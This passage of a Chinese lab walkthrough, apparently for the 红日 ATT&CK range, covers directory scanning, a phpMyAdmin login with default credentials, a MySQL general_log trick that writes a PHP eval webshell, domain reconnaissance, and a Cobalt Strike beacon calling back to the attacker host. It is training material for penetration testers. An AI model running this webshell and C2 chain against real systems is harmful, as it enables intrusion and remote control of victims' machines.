+</span></span></code></pre></td></tr></table></div></div><h4 id=扫描结果>扫描结果</h4><div class=table-wrapper><table><thead><tr><th style=text-align:left>路径</th><th style=text-align:left>状态</th><th style=text-align:left>说明</th></tr></thead><tbody><tr><td style=text-align:left><code>/phpMyAdmin/</code></td><td style=text-align:left>存在</td><td style=text-align:left>phpMyAdmin 管理后台（注意大小写敏感）</td></tr><tr><td style=text-align:left><code>/phpmyadmin/</code></td><td style=text-align:left>存在</td><td style=text-align:left>phpMyAdmin 小写路径（同上）</td></tr><tr><td style=text-align:left><code>/phpinfo.php</code></td><td style=text-align:left>存在</td><td style=text-align:left>PHP 信息泄露页面</td></tr></tbody></table></div><h4 id=参数说明>参数说明</h4><div class=table-wrapper><table><thead><tr><th style=text-align:left>参数</th><th style=text-align:left>作用</th></tr></thead><tbody><tr><td style=text-align:left><code>dir</code></td><td style=text-align:left>目录扫描模式</td></tr><tr><td style=text-align:left><code>-u http://10.10.10.133</code></td><td style=text-align:left>目标URL</td></tr><tr><td style=text-align:left><code>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></td><td style=text-align:left>字典文件路径</td></tr><tr><td style=text-align:left><code>-x php,txt,html,zip,bak,sql,old,log</code></td><td style=text-align:left>指定要扫描的文件扩展名</td></tr><tr><td style=text-align:left><code>-t 50</code></td><td style=text-align:left>50个并发线程，提升速度</td></tr><tr><td style=text-align:left><code>--no-error</code></td><td style=text-align:left>隐藏连接错误信息</td></tr><tr><td style=text-align:left><code>-b 404</code></td><td style=text-align:left>过滤掉404状态码的响应</td></tr><tr><td style=text-align:left><code>| tee dirb/gobuster.txt</code></td><td style=text-align:left>终端实时显示 + 保存到文件</td></tr></tbody></table></div><h3 id=web漏洞发现>Web漏洞发现</h3><p>接下来，我们需要对80端口访问以及爆出的路径</p><h4 id=访问-80-端口>访问 80 端口</h4><p>可以看到这是一个phpstudy探针是 phpStudy 集成环境自带的一个检测页面（l.php 或 index.php），用来展示服务器环境配置信息，方便开发者调试。</p><p><img class=gallery-image data-flex-basis=451px data-flex-grow=188 height=1020 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index2.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index2_hu_9ba03f999af99aa6.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index2_hu_78f9858f37671a26.png 1600w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index2.png 1920w" width=1920></p><p><img class=gallery-image data-flex-basis=451px data-flex-grow=188 height=1020 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index3.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index3_hu_51eb6da5d6641dc.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index3_hu_7f79c4687421bd92.png 1600w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index3.png 1920w" width=1920></p><div class=table-wrapper><table><thead><tr><th style=text-align:left>信息项</th><th style=text-align:left>内容</th><th style=text-align:left>攻击价值</th></tr></thead><tbody><tr><td style=text-align:left><strong>绝对路径</strong></td><td style=text-align:left><code>C:/phpStudy/WWW</code></td><td style=text-align:left>知道Web根目录，后续写Shell时知道路径</td></tr><tr><td style=text-align:left><strong>探针路径</strong></td><td style=text-align:left><code>C:/phpStudy/WWW/l.php</code></td><td style=text-align:left>确认探针文件名</td></tr><tr><td style=text-align:left><strong>PHP版本</strong></td><td style=text-align:left>5.4.45</td><td style=text-align:left>老旧版本，可能存在已知漏洞</td></tr><tr><td style=text-align:left><strong>安全模式 (safe_mode)</strong></td><td style=text-align:left>关闭</td><td style=text-align:left>无安全限制，更容易利用</td></tr><tr><td style=text-align:left><strong>display_errors</strong></td><td style=text-align:left>开启</td><td style=text-align:left>会暴露错误信息，辅助调试</td></tr><tr><td style=text-align:left><strong>allow_url_fopen</strong></td><td style=text-align:left>开启</td><td style=text-align:left>支持远程文件包含(RFI)</td></tr><tr><td style=text-align:left><strong>allow_url_include</strong></td><td style=text-align:left>未显示但通常伴随 fopen</td><td style=text-align:left>可能支持远程文件包含</td></tr><tr><td style=text-align:left><strong>upload_max_filesize</strong></td><td style=text-align:left>2M</td><td style=text-align:left>文件上传大小限制</td></tr><tr><td style=text-align:left><strong>MySQL连接检测</strong></td><td style=text-align:left>页面自带表单</td><td style=text-align:left>可直接测试MySQL连接</td></tr><tr><td style=text-align:left><strong>函数检测</strong></td><td style=text-align:left>页面自带表单</td><td style=text-align:left>可检测任意PHP函数是否存在</td></tr></tbody></table></div><p>很多内容总的来说，接下来我们可以测试如下内容</p><h5 id=1--mysql连接检测--弱口令爆破>1. MySQL连接检测 → 弱口令爆破</h5><p>phpstudy 默认mysql账户密码都是root，输入进去也是显示连接到MySql数据库正常</p><h5 id=2-函数检测--信息收集>2. 函数检测 → 信息收集</h5><p>80端口有对支持输入的函数的查看，不必在这浪费时间，同时，以及确认了mysql的账户密码，对80端口的操作可以先暂停</p><h4 id=phpmyadmin页查看>phpmyadmin页查看</h4><p><img class=gallery-image data-flex-basis=452px data-flex-grow=188 height=240 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345996.png width=452></p><p>phpMyAdmin 是一个基于 Web 的 MySQL 数据库管理工具，通过浏览器就能操作数据库（建表、查数据、执行 SQL 等）</p><p>渗透测试中它是常见的 Getshell 入口</p><p><img class=gallery-image data-flex-basis=451px data-flex-grow=188 height=1020 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index6.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index6_hu_f797fe71014ceae2.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index6_hu_64cf339f42b36b1b.png 1600w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index6.png 1920w" width=1920></p><h5 id=尝试在mysql-执行框写入webshell>尝试在Mysql 执行框写入webshell</h5><p>在这里输入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SHOW</span><span class=w> </span><span class=n>VARIABLES</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;secure_file_priv&#39;</span><span class=p>;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>检查 MySQL 是否允许写入文件、能写到哪些目录</p><div class=table-wrapper><table><thead><tr><th style=text-align:left>secure_file_priv 值</th><th style=text-align:left>含义</th></tr></thead><tbody><tr><td style=text-align:left><strong>NULL</strong></td><td style=text-align:left>禁止写入任何文件</td></tr><tr><td style=text-align:left>空字符串 <code>''</code></td><td style=text-align:left>可以写入任意目录</td></tr><tr><td style=text-align:left>具体路径</td><td style=text-align:left>只能写入该指定目录</td></tr><tr><td style=text-align:left>这里是最坏的结果，不能在这里写入webshell</td><td></td></tr></tbody></table></div><h5 id=尝试日志写入获得shell>尝试日志写入获得shell</h5><p>在执行框依次输入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SET</span><span class=w> </span><span class=k>GLOBAL</span><span class=w> </span><span class=n>general_log</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;ON&#39;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=k>SET</span><span class=w> </span><span class=k>GLOBAL</span><span class=w> </span><span class=n>general_log_file</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;C:/phpStudy/WWW/log.php&#39;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=s1>&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;</span><span class=p>;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>作用如下：</p><p>开启 MySQL 的 <strong>通用查询日志</strong>，记录所有执行的 SQL 语句
+将日志文件路径设置为 Web 根目录下的 log.php
+执行一条包含 PHP 一句话木马 的 SQL，这条语句会被记录到日志文件中</p><p>连接成功</p><p><img class=gallery-image data-flex-basis=355px data-flex-grow=148 height=866 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index5.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index5_hu_ee185e1f52daeffa.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index5.png 1284w" width=1284></p><p>可在log.php查看我们已经的木马写入成功了</p><h2 id=内网信息收集以及权限确认>内网信息收集以及权限确认</h2><p>在蚁剑的终端分别执行以下命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>ipconfig /all
+</span></span></code></pre></td></tr></table></div></div><p>C:\phpStudy\WWW> whoami
+god\administrator</p><p>进一步分析得到</p><div class=table-wrapper><table><thead><tr><th style=text-align:left>项目</th><th style=text-align:left>结果</th><th style=text-align:left>分析</th></tr></thead><tbody><tr><td style=text-align:left><strong>当前用户</strong></td><td style=text-align:left><code>god\administrator</code></td><td style=text-align:left>域管理员权限 直接就是高权限，无需提权</td></tr><tr><td style=text-align:left><strong>主机名</strong></td><td style=text-align:left>stu1</td><td style=text-align:left>确认</td></tr><tr><td style=text-align:left><strong>域名</strong></td><td style=text-align:left>god.org</td><td style=text-align:left>确认</td></tr><tr><td style=text-align:left><strong>外网IP</strong></td><td style=text-align:left>10.10.10.133</td><td style=text-align:left>我们攻击的入口</td></tr><tr><td style=text-align:left><strong>内网IP</strong></td><td style=text-align:left>192.168.52.143</td><td style=text-align:left>内网网段发现！</td></tr><tr><td style=text-align:left><strong>内网DNS</strong></td><td style=text-align:left>192.168.52.138</td><td style=text-align:left>可能是域控或另一台内网机器</td></tr><tr><td style=text-align:left><strong>内网网关</strong></td><td style=text-align:left>192.168.52.2</td><td style=text-align:left>内网路由</td></tr></tbody></table></div><h2 id=内网主机发现>内网主机发现</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\phpStudy\WWW</span><span class=c1>&gt; arp -a</span>
+</span></span><span class=line><span class=cl>接口: 192.168.52.143 --- 0xb
+</span></span><span class=line><span class=cl>  Internet 地址         物理地址              类型
+</span></span><span class=line><span class=cl>  192.168.52.138        00-0c-29-e9-b5-8b     动态        
+</span></span><span class=line><span class=cl>  192.168.52.141        00-0c-29-00-fe-e2     动态        
+</span></span><span class=line><span class=cl>  192.168.52.254        00-50-56-fc-45-e6     动态        
+</span></span><span class=line><span class=cl>  192.168.52.255        ff-ff-ff-ff-ff-ff     静态        
+</span></span><span class=line><span class=cl>  224.0.0.22            01-00-5e-00-00-16     静态        
+</span></span><span class=line><span class=cl>  224.0.0.252           01-00-5e-00-00-fc     静态        
+</span></span><span class=line><span class=cl>接口: 169.254.129.186 --- 0x18
+</span></span><span class=line><span class=cl>  Internet 地址         物理地址              类型
+</span></span><span class=line><span class=cl>  169.254.255.255       ff-ff-ff-ff-ff-ff     静态        
+</span></span><span class=line><span class=cl>  224.0.0.22            01-00-5e-00-00-16     静态        
+</span></span><span class=line><span class=cl>  224.0.0.252           01-00-5e-00-00-fc     静态        
+</span></span><span class=line><span class=cl>  255.255.255.255       ff-ff-ff-ff-ff-ff     静态        
+</span></span><span class=line><span class=cl>接口: 10.10.10.133 --- 0x1a
+</span></span><span class=line><span class=cl>  Internet 地址         物理地址              类型
+</span></span><span class=line><span class=cl>  10.10.10.1            00-50-56-c0-00-08     动态        
+</span></span><span class=line><span class=cl>  10.10.10.2            00-50-56-f0-e1-42     动态        
+</span></span><span class=line><span class=cl>  10.10.10.10           00-0c-29-28-62-c4     动态        
+</span></span><span class=line><span class=cl>  10.10.10.254          00-50-56-fa-87-c5     动态        
+</span></span><span class=line><span class=cl>  10.10.10.255          ff-ff-ff-ff-ff-ff     静态        
+</span></span><span class=line><span class=cl>  224.0.0.22            01-00-5e-00-00-16     静态        
+</span></span><span class=line><span class=cl>  224.0.0.252           01-00-5e-00-00-fc     静态        
+</span></span><span class=line><span class=cl>  255.255.255.255       ff-ff-ff-ff-ff-ff     静态
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th style=text-align:left>IP 地址</th><th style=text-align:left>MAC 地址</th><th style=text-align:left>类型</th><th style=text-align:left>分析</th></tr></thead><tbody><tr><td style=text-align:left><code>192.168.52.138</code></td><td style=text-align:left><code>00-0c-29-e9-b5-8b</code></td><td style=text-align:left>动态</td><td style=text-align:left>内网域机器</td></tr><tr><td style=text-align:left><code>192.168.52.141</code></td><td style=text-align:left><code>00-0c-29-00-fe-e2</code></td><td style=text-align:left>动态</td><td style=text-align:left>网域机器</td></tr><tr><td style=text-align:left><code>192.168.52.254</code></td><td style=text-align:left><code>00-50-56-fc-45-e6</code></td><td style=text-align:left>动态</td><td style=text-align:left>虚拟网关/DHCP</td></tr><tr><td style=text-align:left><code>10.10.10.10</code></td><td style=text-align:left><code>00-0c-29-28-62-c4</code></td><td style=text-align:left>动态</td><td style=text-align:left>Kali 攻击机</td></tr></tbody></table></div><h2 id=确认域环境>确认域环境</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\phpStudy\WWW</span><span class=c1>&gt; ping -a -n 1 192.168.52.138</span>
+</span></span><span class=line><span class=cl>正在 Ping owa [192.168.52.138] 具有 32 字节的数据:
+</span></span><span class=line><span class=cl>来自 192.168.52.138 的回复: 字节=32 时间=3ms TTL=128
+</span></span><span class=line><span class=cl>192.168.52.138 的 Ping 统计信息:
+</span></span><span class=line><span class=cl>    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，
+</span></span><span class=line><span class=cl>往返行程的估计时间(以毫秒为单位):
+</span></span><span class=line><span class=cl>    最短 = 3ms，最长 = 3ms，平均 = 3ms
+</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\phpStudy\WWW</span><span class=c1>&gt; ping -a -n 1 192.168.52.141</span>
+</span></span><span class=line><span class=cl>正在 Ping ROOT-TVI862UBEH [192.168.52.141] 具有 32 字节的数据:
+</span></span><span class=line><span class=cl>来自 192.168.52.141 的回复: 字节=32 时间<span class=p>&lt;</span>1ms TTL=128
+</span></span><span class=line><span class=cl>192.168.52.141 的 Ping 统计信息:
+</span></span><span class=line><span class=cl>    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，
+</span></span><span class=line><span class=cl>往返行程的估计时间(以毫秒为单位):
+</span></span><span class=line><span class=cl>    最短 = 0ms，最长 = 0ms，平均 = 0ms
+</span></span></code></pre></td></tr></table></div></div><p>-a 参数会尝试将 IP 解析为主机名</p><div class=table-wrapper><table><thead><tr><th style=text-align:left>IP 地址</th><th style=text-align:left>主机名</th><th style=text-align:left>分析</th></tr></thead><tbody><tr><td style=text-align:left><code>192.168.52.138</code></td><td style=text-align:left>OWA</td><td style=text-align:left>Exchange 相关主机名，通常是域控或邮件服务器</td></tr><tr><td style=text-align:left><code>192.168.52.141</code></td><td style=text-align:left>ROOT-TVI862UBEH</td><td style=text-align:left>随机生成的主机名，通常是域成员工作站</td></tr></tbody></table></div><h2 id=域控身份确认>域控身份确认</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\phpStudy\WWW</span><span class=c1>&gt; net group &#34;domain controllers&#34; /domain</span>
+</span></span><span class=line><span class=cl>这项请求将在域 god.org 的域控制器处理。
+</span></span><span class=line><span class=cl>组名     Domain Controllers
+</span></span><span class=line><span class=cl>注释     域中所有域控制器
+</span></span><span class=line><span class=cl>成员
+</span></span><span class=line><span class=cl>----------------------------------------------------------------
+</span></span><span class=line><span class=cl>OWA$                     
+</span></span><span class=line><span class=cl>命令成功完成
+</span></span></code></pre></td></tr></table></div></div><h2 id=内网拓扑确认>内网拓扑确认</h2><div class=table-wrapper><table><thead><tr><th style=text-align:left>IP</th><th style=text-align:left>主机名</th><th style=text-align:left>角色</th></tr></thead><tbody><tr><td style=text-align:left><code>192.168.52.138</code></td><td style=text-align:left><strong>OWA</strong></td><td style=text-align:left>域控 (Domain Controller)</td></tr><tr><td style=text-align:left><code>192.168.52.141</code></td><td style=text-align:left>ROOT-TVI862UBEH</td><td style=text-align:left>域成员</td></tr><tr><td style=text-align:left><code>192.168.52.143</code></td><td style=text-align:left>STU1 (当前机器)</td><td style=text-align:left>域成员 + Web服务器</td></tr></tbody></table></div><h2 id=确认域控是否开放445端口>确认域控是否开放445端口</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\phpStudy\WWW</span><span class=c1>&gt; powershell -c &#34;$c=New-Object System.Net.Sockets.TcpClient;$c.Connect(&#39;192.168.52.138&#39;,445);if($c.Connected){Write-Host &#39;445 OPEN&#39; -ForegroundColor Green}else{Write-Host &#39;445 CLOSED&#39; -ForegroundColor Red}&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>445 OPEN
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th style=text-align:left>参数</th><th style=text-align:left>作用</th></tr></thead><tbody><tr><td style=text-align:left><code>powershell -c</code></td><td style=text-align:left>执行 PowerShell 命令</td></tr><tr><td style=text-align:left><code>"..."</code></td><td style=text-align:left>命令字符串</td></tr><tr><td style=text-align:left><code>$c=New-Object System.Net.Sockets.TcpClient</code></td><td style=text-align:left>创建 TCP 客户端对象</td></tr><tr><td style=text-align:left><code>$c.Connect('192.168.52.138',445)</code></td><td style=text-align:left>尝试连接目标 IP 的 445 端口</td></tr><tr><td style=text-align:left><code>if($c.Connected)</code></td><td style=text-align:left>判断连接是否成功</td></tr><tr><td style=text-align:left><code>Write-Host '445 OPEN' -ForegroundColor Green</code></td><td style=text-align:left>连接成功 → 显示绿色"445 OPEN"</td></tr><tr><td style=text-align:left><code>else{Write-Host '445 CLOSED' -ForegroundColor Red}</code></td><td style=text-align:left>连接失败 → 显示红色"445 CLOSED"</td></tr></tbody></table></div><h2 id=尝试横向移动到域控>尝试横向移动到域控</h2><p>先确认当前机器是否有 PsExec</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> C:\phpStudy\WWW\psexec.exe
+</span></span></code></pre></td></tr></table></div></div><p>十分遗憾，确认445端口打开，但是没有远程工具</p><p>现在有两种选择</p><ol><li>利用msf快速上线</li><li>利用cs生成payload</li></ol><p>cs在域渗透这方面更强大，先演示cobalt strike 这里是4.7版本</p><h2 id=cs上线>cs上线</h2><h3 id=teamserver部署kali>Teamserver部署（Kali）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Cobalt_Strike_4.7<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ chmod +x teamserver
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Cobalt_Strike_4.7<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo ./teamserver 10.10.10.10 <span class=m>123456</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Team Server Version: 4.7 <span class=o>(</span>20220817<span class=o>)</span> Licensed
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Setting <span class=s1>&#39;https.protocols&#39;</span> system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Loading Windows error codes.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Windows error codes loaded
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Loading beacons
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>0</span> beacons
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Loading properties file <span class=o>(</span>/home/kali/Labs/Cobalt_Strike_4.7/TeamServer.prop<span class=o>)</span>.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Properties file was loaded.
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Team server is up on 0.0.0.0:50050
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> SHA256 <span class=nb>hash</span> of SSL cert is: 56a06a233bd30f693de25ef12cc19e8b2c92d3eb97dd969a2578df084c376478
+</span></span></code></pre></td></tr></table></div></div><p>回到客户端</p><p><img class=gallery-image data-flex-basis=316px data-flex-grow=131 height=339 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345994.png width=447></p><p>这里的ip是我的kali ip</p><p><img class=gallery-image data-flex-basis=451px data-flex-grow=188 height=1020 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345993.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345993_hu_7ca6573b4ea800f3.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345993_hu_90ac49f3c7d3b33.png 1600w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345993.png 1920w" width=1920></p><p>回到kali</p><p>多出来一个 [+] Listener: win7 started!</p><h3 id=payload生成与执行>Payload生成与执行</h3><p>回到客户端选择有效荷载->选择window可执行程序->监听器选择win7，保存到了宿主机的火绒信任的文件夹内</p><p><img class=gallery-image data-flex-basis=353px data-flex-grow=147 height=872 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index4.png srcset="/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index4_hu_e9e6f04570c642b7.png 800w, /p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/index4.png 1284w" width=1284></p><p>再回到蚁剑的虚拟终端执行这个程序</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\phpStudy\WWW</span><span class=c1>&gt; artifact.exe</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=beacon上线确认>Beacon上线确认</h3><p>回到cs主界面</p><p>消息日志多了这一行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>07/22 01:55:45 *** initial beacon from Administrator *@169.254.129.186 (STU1)
